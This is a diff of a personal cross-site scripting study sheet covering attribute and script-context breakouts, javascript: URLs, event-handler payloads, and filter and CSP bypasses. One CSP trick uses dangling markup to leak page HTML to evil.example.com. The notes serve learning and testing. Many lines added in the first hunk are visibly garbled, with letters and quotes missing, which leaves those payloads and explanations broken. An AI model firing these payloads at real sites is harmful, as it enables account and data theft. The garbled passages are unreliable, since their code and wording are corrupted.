@@ -39,160 +39,159 @@ jsnice.org
  + Note that things in `()` runs first like in math
  + Browser doesn't care about dangling _closing tags_ like `</textarea>`
   - or a lack of one `<iframe><iframe></iframe>`
- 
+
+### Execution - Table of Contents 
  1. HTML Attributes
  2. URLs
  3. Event Handling
  4. Inside JS
- 5. Exploit Development
- 6. XS-Search
+ 5. XS-Search
+ 6. Execution Without `script` Keyword 
 
 
        ============================================================
 
 
-  **1. HTML Attributes**
-+ Uses: Html Attributs, Html Tags, & JS Functions
+## [Execution] (1) - HTML Attributes
++ Us: Html Atributs, Html Tags, & JS Functions
 ``` 
-Template:               | Example:
-                        |
-     +---- attributes   |                         tag      value
-     |                  |                          |         |
-     V                  |                          V         v
- tag = "value"          | <h1 class "hover-title" title="something">Hover</h1>
+Tempte:              | Example:
+                     |
+    ---- attrbutes   |                         tag      value
+                     |                          |         |
+                     |                          V         v
+ tag "value"         | <h1 class "hover-title" title="something">Hover</h1>
 ```
 
-+ Break out With
- 1. `'` - singe qutoes:  `'(payload)`
- 2. `"` - double qutoes: `"(payload)`
- 3. Space Characters: `(space, \f, \n, \r, \t)`
++ Brk out Wit
+ 1. ` - singequtoes:  `'(payload)`
+ 2. ` - doubl qutoes: `"(payload)`
+ 3. ace Charaters: `(space, \f, \n, \r, \t)`
 
-+ Examples
- - Basic: `"><script>alert(document.domain)</script>`
- - Basic: `"</textarea><script>alert(document.domain)</script>`
-
-
-       ============================================================
++ Exples
+ - Bic: `"><sript>alert(document.domain)</script>`
+ - Bic: `"</txtarea><script>alert(document.domain)</script>`
 
 
-  **2. URLs**
-* Uses: Html Attributes, Html Tags, JS Functions, URL Schemes
-* Note that `javascript:alert()` or `"javascript:alert()"` should work regardless of quotes
+     ===========================================================
 
-+ Potential Tag Targets 
- - Link:   <a href="{{input_from_url}}">Link</a>
- - iFrame: <iframe src="{{input_from_url}}"></frame>
+
+## [Execution] (2) - URLs
+* Us: Html Atributes, Html Tags, JS Functions, URL Schemes
+* No that `jaascript:alert()` or `"javascript:alert()"` should work regardless of quotes
+
++ Pontial TagTargets 
+ - Lk:   <a hef="{{input_from_url}}">Link</a>
+ - iame: <ifrme src="{{input_from_url}}"></frame>
  
-+ Examples:
- - Basic: `javascript:alert(document.domain)`
++ Exples:
+ - Bic: `javacript:alert(document.domain)`
 
-+ Sample Results that pull from URL:
++ Sale Result that pull from URL:
 
- - location = 'javascript:alert()'
- - <iframe src=javascript:alert()></iframe>
- - <a href=javascript:alert()>Link></a>
+ - lation = 'avascript:alert()'
+ - <rame src=avascript:alert()></iframe>
+ - <href=javacript:alert()>Link></a>
  
-+ `<h1>` Elements is _NOT going to work_ cause it _doesn't host content_ from another webpage
++ `<>` Elemens is _NOT going to work_ cause it _doesn't host content_ from another webpage
 
 
-       ============================================================
+     ===========================================================
 
-
-  **3. Event Handling**
-* Uses: CSS, Events, Event Handling, Html Attributes, JS Fucntions, URL Encoding
-* See cheat sheet _xss-cheat-sheet.pdf_ for more
-
-+ Sample Events
- - _Onoload_: executes given javascript function when tag loads
-  * Body Tag Example: `<body onload=alert(‘Welcome to Hacking Articles’)>`
- - _onerror_
-  * `<img src=invalid onerror=alert()>`
- - _Onmouseover_: when a user moves his cursor over a specific text
-  * `<a onmouseover=alert(“50% discount”)>surprise</a>`
- - _Etc._
- 
-
-+ Examples
- - `'onload=alert'()`  --->  `class ='title 'onload'='alert()'`
-
-
-+ Use **CSS Styling** to change _how things appear_ on the website
- - Can use `style`                                                           v--- url encoding
- - Example: `'onmouseover=alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
-                                                                             ^--- % is \x25
- - Self-Delete `style`: `"onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');`
-  * can put this  in between `onmouseover=` and `alert();`
-  
- - Full: `'onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
-
-
-       ============================================================
-
-
-  **4. Inside JS**
-* Uses: JS Arrays/comments/functions/numbers/strings/objects/operators/template literals
-* Browser will _parse Html BEFORE running JS_
-* This **assumes you're input/source is INSIDE** `<script>` & `</script>`
-
-       - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-
-    1. **Break Out of String Context** within `<script>` & `</script>`
-      + To _prevent errors_, surround payload with _proper quotes_ and `+`s or `-`s
-       - In the templates below the `'`, `"`, `backticks` are used to _exit the string context_
-       - Then the `+` or `-` help prevent the JS for failing
-     ```Templates
-     <script>
-         ''+payload+''   ''-payload-''
-         ""+payload+""   ""-payload-""
-         ``+payload+``   ``-payload-``
-     </script>
-     ```
-     ```Examples
-     <script>
-       ''+alert()+'' 
-        var input = ''+alert()+''
-     </script>
-     ```
     
-      + When using the **backtick**, while it can be used in a string, it can also _hold code_:
-    ```BACKTICKS_Inject_Code
-      `${code}`
-      `${alert()}`
-      ^----------- Only works on backticks (not "" or '')
+## [Execution] (3) - Event Handling
+* Us: CSS, Evnts, Event Handling, Html Attributes, JS Fucntions, URL Encoding
+* Secheat shet _xss-cheat-sheet.pdf_ for more
+
++ Sale Events
+ - _oload_: eecutes given javascript function when tag loads
+  * dy Tag Exmple: `<body onload=alert(‘Welcome to Hacking Articles’)>`
+ - _error_
+  * img src=ivalid onerror=alert()>`
+ - _mouseover: when a user moves his cursor over a specific text
+  * a onmousever=alert(“50% discount”)>surprise</a>`
+ - _c._
+ 
+
++ Exples
+ - `nload=alet'()`  --->  `class ='title 'onload'='alert()'`
+
+
++ Us**CSS Stying** to change _how things appear_ on the website
+ - C use `stye`                                                           v--- url encoding
+ - Emple: `'omouseover=alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
+                                                                          ^--- % is \x25
+ - Sf-Delete style`: `"onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');`
+  * n put thi  in between `onmouseover=` and `alert();`
+  
+ - Fl: `'onmoseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
+
+
+     ===========================================================
+
+
+## [Execution] (4) - Inside JS
+* Us: JS Arras/comments/functions/numbers/strings/objects/operators/template literals
+* Brser will parse Html BEFORE running JS_
+* Th **assume you're input/source is INSIDE** `<script>` & `</script>`
+
+     - - - -  - - - - - - - - - - - - - - - - - - - - - - - - -
+
+     **Break ut of String Context** within `<script>` & `</script>`
+    + To _preent errors_, surround payload with _proper quotes_ and `+`s or `-`s
+     - In thetemplates below the `'`, `"`, `backticks` are used to _exit the string context_
+     - Then te `+` or `-` help prevent the JS for failing
+    ``Templats
+    script>
+       ''+payoad+''   ''-payload-''
+       ""+payoad+""   ""-payload-""
+       ``+payoad+``   ``-payload-``
+    /script>
+    ``
+    ``Example
+    script>
+     ''+alert)+'' 
+      var inpt = ''+alert()+''
+    /script>
+    ``
+    
+    + When usng the **backtick**, while it can be used in a string, it can also _hold code_:
+    `BACKTICK_Inject_Code
+    `${code}`
+    `${alert(}`
+    ^---------- Only works on backticks (not "" or '')
+    `
+
+    + Use a _losing with an opening_ tag `</script><script>`
+    ```Exampl
+    script>
+    let s = '/script><script>alert()//'
+    /script>
     ```
 
-      + Use a _closing with an opening_ tag `</script><script>`
-      ```Example
-     <script>
-      let s = '</script><script>alert()//'
-     </script>
-      ```
-
-       - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+     - - - -  - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
-    2. **Break Out of Array Context** within `<script>` & `</script>`
-     ```',alert,'
-     [1,'',alert(),'']
-    ```
-    ```',x:alert(),'
-    {number:1,name'',x:alert(),y:''}
-     ```
+     **Break ut of Array Context** within `<script>` & `</script>`
+    ``',alert'
+    1,'',aler(),'']
+    `
+    `',x:aler(),'
+    umber:1,nme'',x:alert(),y:''}
+    ``
 
-       ============================================================
+     ===========================================================
 
 
-  **6. XS-Search**
+## [Execution] (5) - XS-Search
 [LiveOverflow]: https://www.youtube.com/watch?v=HcrQy0C-hEA
-
-       ============================================================
+       
+## [Execution] (6) - Without the `script` Keyword
++ `<audio src/onerror=alert(1)>`
 
 
 ------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------
-
-
 
 # 2. Bypass Filter/Sanitization
 
@@ -202,14 +201,22 @@ Template:               | Example:
 
 **Things to Try**
 
-+ If the _"__ doesn't break out of class attribute context
++ If the _"_ doesn't break out of class attribute context
  - Just throw in a _'_ or _`_ to see if it works
 
 
-       ============================================================
+### Execution - Table of Contents 
+ 1. Polyglot 
+ 2. Bypass Filters 
+ 3. XSS Payload Without = `javascript:`, `on*=*`, `alert()`
+ 4. XSS Payload Without - &<>"=() 
+ 5. Bypass CSP 
+ 6. JS Fuck 
+ 7. JSONP 
+ 8. Regex 
+ 9. Regex Bypass for Safari
 
-
-**Polyglot**
+## [Bypassing] (1) - Polyglot
 + Single payload to test multiple things
 + Payload of All Things Has Some Examples
   ```Things_Tested
@@ -225,8 +232,7 @@ Template:               | Example:
 
 + parentheses `()` follow before JS like `onload=alert()`
 
-
-**Bypass Filters**
+## [Bypassing] (2) - Bypass Filters 
 
 + Can use `/` after tag name instead of a space
   `<iframe/oNloAd=alert()//>`
@@ -235,21 +241,14 @@ Template:               | Example:
  - The Browser will _AUTOMATICALLY DECODE URL encoded values_
  - Encoded URL parameters get decoded when variables from URL 
 
-       ============================================================
-
-
-**XSS payload without = `javascript:`, `on*=`,`alert()`**
+## [Bypassing] (3) - XSS Payload Without = `javascript:`, `on*=`,`alert()`
 
 + Space Characters: `(space, \f, \n, \r, \t)`
 + Capitalization: `jAvaScriPt`
 + Look at the payload of all things for more
   [Payload of All Things]: https://github.com/swisskyrepo/PayloadsAllTheThings
 
-
-       ============================================================
-
-
-**XSS payload without - &<>"=()**
+## [Bypassing] (4) - XSS Payload Without - &<>"=()
 [Link]: https://security.stackexchange.com/questions/173032/xss-payload-without
 
 **Script Gadgets**
@@ -257,12 +256,9 @@ Template:               | Example:
 [Video]: https://www.youtube.com/watch?v=p07acPBi-qw&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=4
 
 + DOM XSS notes has more detail on this
-
-
-       ============================================================
        
        
-**Bypass CSP**
+## [Bypassing] (5) - Bypass CSP
 * Uses: CSP, CSS, Html Comments, Html Elements, JS Fucntions, URLs
 
 + _Whitelisting generic CDN domains_ - `generic.cdn.example.com`
@@ -303,32 +299,20 @@ Template:               | Example:
    `<img src='https://evil.example.com?`
  - If you look at the _nework tab_ in the _developer tools_ the html from the webpage can be send
 
-
-       
-       ============================================================
-
-
-**JS Fuck**
+## [Bypassing] (6) - JS Fuck
 [Link]: http://www.jsfuck.com/
 + Javascript only using: `[]()!` -  may be some other
 
-
-       ============================================================
-
-
-**JSONP**
+## [Bypassing] (7) - JSONP
 * CORS Attack
 [There's a chapter on JSONP - LiverOverflow]: https://www.youtube.com/watch?v=aCexqB9qi70
 
-
-       ============================================================
-
-**Regex**
+## [Bypassing] (8) - Regex
 + Break out of _regex context_ with the `/`
 + `*-` after the forward slash is ok and won't throw an error so long as 
 + Parantheses `()` 
 
-**Regex Bypass - Safari**
+## [Bypassing] (9) - Regex Bypass for Safari
 1. Use regex format in _Safari_
 [LiveOverflow]: https://www.youtube.com/watch?v=eQFbG6CwwdI
 ```Regex_Format
@@ -346,14 +330,10 @@ Template:               | Example:
          ^--------------------------------------------------------+
 ```
 
-
-       ============================================================
-
-
-------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
     
+
 # 3. Exploit Development
 * Uses: CSS Selectors, Events, Event Handlers, JS Ajax Requests, JS Functions,
         JS HTML Collections, JS strings, JS objects, JS variables, JSON encoding,
@@ -521,9 +501,9 @@ Template:               | Example:
 ------------------------------------------------------------------------------------------
 
 
-### 6. Tips
+# 6. Tips
 
-**Cause a JS Error to see how browser sees it**
+## [TIPS] (1) - Cause a JS Error to see how browser sees it
 
 1. Write something that will cause an error
 ```JS_Error
@@ -537,7 +517,6 @@ Template:               | Example:
   + You should now see how the browser sees your input 
 
 
-------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------
 
